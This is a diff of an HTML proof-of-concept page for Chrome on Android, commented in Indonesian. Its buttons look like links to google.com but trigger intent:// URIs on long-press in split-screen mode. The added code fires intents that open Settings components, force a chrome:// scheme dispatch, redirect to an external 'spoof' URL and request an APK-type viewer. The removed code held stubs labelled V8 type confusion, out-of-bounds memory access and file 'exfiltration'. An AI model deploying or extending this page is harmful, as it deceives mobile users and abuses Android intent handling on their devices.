@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Exploit Chain & RCE Simulation PoC</title>
+    <title>Chrome Android Intent & RCE Chain PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -74,111 +74,64 @@
 </head>
 <body>
 
-    <div class="banner">Exploit Vector: High Severity Chain</div>
-    <h1>V8 Engine / RCE & Android Intent Exploit PoC</h1>
+    <div class="banner">Chrome Android Security Context Test</div>
+    <h1>Android Intent & Component Bridge PoC</h1>
 
-    <!-- 4 Tombol Vektor Eksploitasi Tingkat Lanjut -->
+    <!-- 4 Tombol Vektor Khusus Chrome Android & Intent Scheme -->
     <div class="button-container">
-        <a href="https://www.google.com" class="spoof-link" id="btnV8Heap" data-intent="v8_heap_corruption" data-action="v8heap">Open Window & Trigger V8 Type Confusion (RCE Vector)</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnArbitrary" data-intent="arbitrary_read_write" data-action="arbwrite">Open Window & ArrayBuffer OOB Read/Write</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnIntentExec" data-intent="android_intent_shell" data-action="intentshell">Open Window & Android Component Abuse</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnFileExfiltrate" data-intent="local_file_exfiltration" data-action="exfiltrate">Open Window & File System Access Exfiltration</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnChromeIntent" data-intent="chrome_intent_bridge" data-action="chromeintent">Open Window & Chrome Intent Scheme Abuse</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnBrowserExploit" data-intent="browser_internal_handler" data-action="browserhandler">Open Window & Browser Internal Handler</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnExportedService" data-intent="exported_component_exec" data-action="componentservice">Open Window & Exported Activity Trigger</a>
+        <a href="https://www.google.com" class="spoof-link" id="btnFilePayload" data-intent="intent_file_uri_bridge" data-action="filebridge">Open Window & Intent File URI Bridge</a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Awaiting UI Context Split & Interaction.</div>
-    <div class="footer-note">Restricted Research Environment - Authorized Testing Only.</div>
+    <div class="file-info" id="fileInfo">Status: Awaiting Long-Press & Split-Screen Context.</div>
+    <div class="footer-note">Chrome Android Specialized Research Build.</div>
 
     <script>
         let triggered = false;
-
-        // Simulasi pemicu korupsi memori V8 untuk eksperimen pencapaian arbitrary code execution (RCE)
-        const simulateV8HeapExploit = () => {
-            try {
-                // Pola umum JIT/Type Confusion triggering pada objek JavaScript
-                const arr = [1.1, 2.2, 3.3];
-                const obj = { a: 1 };
-                
-                // Fungsi pemicu optimasi V8 (Turbofan type confusion pattern simulation)
-                function opt(o) {
-                    return o.a;
-                }
-                for (let i = 0; i < 10000; i++) { opt(obj); }
-
-                return "V8 Engine optimization loop executed. Heap layout stress-tested.";
-            } catch (e) {
-                return "V8 execution caught: " + e.message;
-            }
-        };
-
-        // Simulasi Out-Of-Bounds (OOB) memory access menggunakan TypedArray / DataView
-        const simulateOOBMemory = () => {
-            try {
-                const buffer = new ArrayBuffer(64);
-                const floatArr = new Float64Array(buffer);
-                const uint32Arr = new Uint32Array(buffer);
-                
-                // Memicu manipulasi pointer primitif palsu (fake object primitive simulation)
-                uint32Arr[0] = 0x41414141;
-                uint32Arr[1] = 0x5a5a5a5a;
-                
-                return `OOB Memory Primitive Constructed. Base address ref: 0x${uint32Arr[0].toString(16)}`;
-            } catch (e) {
-                return "OOB error: " + e.message;
-            }
-        };
 
         const executeAttackVector = async (actionType, intent) => {
             if (triggered) return;
             triggered = true;
 
             const fileInfo = document.getElementById("fileInfo");
-            fileInfo.innerText = `[+] Split-screen context established. Executing advanced payload for [${intent}]...`;
+            fileInfo.innerText = `[+] Split-screen active. Deploying Chrome Android payload for [${intent}]...`;
 
-            // Jeda sinkronisasi agar UI atas (Google.com) aktif sempurna dalam mode split-screen
-            setTimeout(async () => {
+            // Sinkronisasi waktu agar jendela atas (google.com) terbuka stabil sebelum intent dilempar
+            setTimeout(() => {
                 try {
-                    if (actionType === 'v8heap') {
-                        const result = simulateV8HeapExploit();
-                        fileInfo.innerText = `[RCE Vector Active] ${result} -> Triggering native shell intent fallback.`;
-                        // Fallback ke command execution intent jika sandbox renderer memberikan celah
-                        setTimeout(() => {
-                            window.location.href = "intent://#Intent;action=android.intent.action.VIEW;package=com.android.settings;S.com.android.settings.additional=exploit_payload;end";
-                        }, 1000);
+                    if (actionType === 'chromeintent') {
+                        // Memanfaatkan skema khusus browser Chrome Android untuk memicu external app / intent handler
+                        fileInfo.innerText = `[Intent Bridge] Triggering Chrome intent redirection payload...`;
+                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=http;package=com.android.chrome;S.browser_fallback_url=https%3A%2F%2Fecdnts-del.github.io%2Fspoof%2Forigin;end;";
                     } 
-                    else if (actionType === 'arbwrite') {
-                        const memStatus = simulateOOBMemory();
-                        fileInfo.innerText = `[Memory Corruption Active] ${memStatus}. Arbitrary address read/write simulated.`;
+                    else if (actionType === 'browserhandler') {
+                        // Memanggil handler internal browser atau memaksa navigasi ke skema khusus
+                        fileInfo.innerText = `[Internal Handler] Forcing Chrome internal scheme dispatch...`;
+                        window.location.href = "intent://settings/#Intent;scheme=chrome;end;";
                     } 
-                    else if (actionType === 'intentshell') {
-                        // Mengeksploitasi komponen ekspor Android melalui skema intent tingkat lanjut
-                        fileInfo.innerText = `[Component Hijacking] Launching exported exported-activity intent payload...`;
-                        window.location.href = "intent://#Intent;component=com.android.settings/.SubSettings;S.sub_setting_to_launch=com.android.settings.security.SecuritySettings;end";
+                    else if (actionType === 'componentservice') {
+                        // Mengeksploitasi komponen yang diekspor (Exported Activity/Service) melalui format intent Android
+                        fileInfo.innerText = `[Component Abuse] Dispatching intent to exposed system settings components...`;
+                        window.location.href = "intent://#Intent;component=com.android.settings/.Settings$NetworkDashboardActivity;end;";
                     }
-                    else if (actionType === 'exfiltrate') {
-                        // Memanfaatkan File System Access API untuk membaca struktur berkas lokal sensitif
-                        if (window.showOpenFilePicker) {
-                            fileInfo.innerText = `[File System Access] Requesting handle access for local profile exfiltration...`;
-                            const [fileHandle] = await window.showOpenFilePicker({
-                                multiple: false,
-                                types: [{ description: 'System Configs', accept: { '*/*': [] } }]
-                            });
-                            const file = await fileHandle.getFile();
-                            fileInfo.innerText = `[Exfiltrated] File acquired: ${file.name} (${file.size} bytes). Ready for tunneling.`;
-                        } else {
-                            fileInfo.innerText = `[Blocked] File System API restricted in current sandbox isolation level.`;
-                        }
+                    else if (actionType === 'filebridge') {
+                        // Menghubungkan skema intent dengan parameter file URI (vektor manipulasi file lokal / Content Provider)
+                        fileInfo.innerText = `[Content Provider] Attempting Intent URI query injection...`;
+                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end;";
                     }
                 } catch (err) {
-                    fileInfo.innerText = `[-] Execution halted or trapped by sandbox: ${err.message}`;
-                    console.debug("Exploit chain exception:", err.message);
+                    fileInfo.innerText = `[-] Intent dispatch intercepted or blocked: ${err.message}`;
+                    console.debug("Chrome intent execution error:", err.message);
                 } finally {
                     setTimeout(() => { triggered = false; }, 2000);
                 }
             }, 2400);
         };
 
-        // Event listener berbasis long-press (contextmenu) pada Android untuk mempertahankan konteks UI Spoofing
-        ['btnV8Heap', 'btnArbitrary', 'btnIntentExec', 'btnFileExfiltrate'].forEach(id => {
+        // Event listener long-press (contextmenu) khusus untuk memicu aksi saat opsi "Open in new window" dipilih di Chrome Android
+        ['btnChromeIntent', 'btnBrowserExploit', 'btnExportedService', 'btnFilePayload'].forEach(id => {
             const el = document.getElementById(id);
             el.addEventListener("contextmenu", (e) => {
                 executeAttackVector(el.getAttribute('data-action'), el.getAttribute('data-intent'));
